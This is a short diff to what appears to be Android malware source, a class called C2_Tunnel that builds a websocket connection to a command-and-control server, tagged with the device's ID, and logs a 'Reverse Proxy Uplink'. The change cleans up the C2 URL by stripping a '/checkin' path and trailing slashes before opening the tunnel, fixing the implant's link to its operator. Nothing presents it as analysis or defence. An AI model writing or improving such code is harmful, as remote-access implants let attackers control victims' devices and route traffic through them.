@@ -55,8 +55,16 @@ public class C2_Tunnel {
             return;
         }
 
+        String baseC2 = c2Url.trim();
+        if (baseC2.endsWith("/checkin")) {
+            baseC2 = baseC2.substring(0, baseC2.length() - 8);
+        }
+        while (baseC2.endsWith("/")) {
+            baseC2 = baseC2.substring(0, baseC2.length() - 1);
+        }
+
         String deviceId = C2_Uploader.getDeviceId(context);
-        String wsUrl = c2Url.replace("http://", "ws://").replace("https://", "wss://") + "/tunnel?deviceId=" + deviceId;
+        String wsUrl = baseC2.replace("http://", "ws://").replace("https://", "wss://") + "/tunnel?deviceId=" + deviceId;
 
         isConnecting = true;
         Log.d(TAG, "Initiating Reverse Proxy Uplink: " + wsUrl);
